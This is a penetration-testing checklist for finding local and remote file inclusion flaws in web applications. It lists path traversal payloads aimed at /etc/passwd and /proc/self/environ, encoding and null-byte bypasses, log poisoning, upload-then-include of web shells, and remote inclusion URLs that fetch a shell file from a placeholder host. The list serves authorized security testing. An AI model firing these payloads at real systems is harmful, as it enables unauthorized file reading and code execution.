1.  **Initial Information Gathering**
    - [ ] Identify and map all endpoints that accept file path inputs.
    - [ ] Review source code (if available) to understand file handling mechanisms.
    - [ ] Check for endpoints where file paths are passed as parameters in URLs, headers, or body.

2.  **Basic LFI Testing**
    - [ ] `../../../../etc/passwd`
    - [ ] `..%2F..%2F..%2F..%2Fetc%2Fpasswd`
    - [ ] `../../../../../../../../../../../etc/passwd`
    - [ ] Try to include different system files (e.g., `/etc/hosts`, `/proc/version`, `C:\Windows\win.ini`).

3.  **Path Traversal**
    - [ ] URL encoding: `%2e%2e%2f`, `%2e%2e%2f`
    - [ ] Double URL encoding: `%252e%252e%252f`
    - [ ] Unicode encoding: `..%c0%af..%c0%af..%c0%af`
    - [ ] Test bypass techniques for traversal filters (e.g., using null bytes `.%00`, appending slashes).

4.  **Advanced Path Traversal Techniques**
    - [ ] Test for double encoding vulnerabilities.
    - [ ] Try bypassing filters with non-standard encodings and mixed encodings.
    - Use directory traversal sequences with variations like:
        - [ ] `....//`
        - [ ] `....\/`
        - [ ] `%2e%2e%2f%2e%2e%2f`

5.  **File Inclusion and Execution**
    - [ ] `/etc/passwd` (Linux)
    - [ ] `/proc/self/environ`
    - [ ] `/proc/self/fd/0`
    - [ ] `C:\Windows\win.ini` (Windows)
    - [ ] Test for inclusion of log files, configuration files, or other readable files.

6.  **Null Byte Injection**
    - [ ] `/etc/passwd%00`
    - [ ] `C:\Windows\win.ini%00`

7.  **File Upload and Inclusion**
    
    - [ ] Check if file upload functionalities are present and try uploading files for inclusion.
    - [ ] Test inclusion of uploaded files to execute code (e.g., web shells).

8.  **Log Poisoning and Inclusion**
    - [ ] Inject payload into User-Agent, Referer, or other headers.
    - [ ] Include poisoned log files to execute injected payloads.

9.  **Remote File Inclusion (RFI)**
    
    - [ ] Check if the application allows remote file inclusion.
    -  Test including remote files via HTTP or FTP URLs:
        - [ ] `http://example.com/shell.txt`
        - [ ] `ftp://example.com/shell.txt`

10. **Error Handling and Response Analysis**
    - [ ] Analyze server responses for clues about the presence of LFI vulnerabilities.
    - [ ] Look for error messages that disclose file paths or other sensitive information.
    - [ ] Verify if application stack traces are exposed in responses.
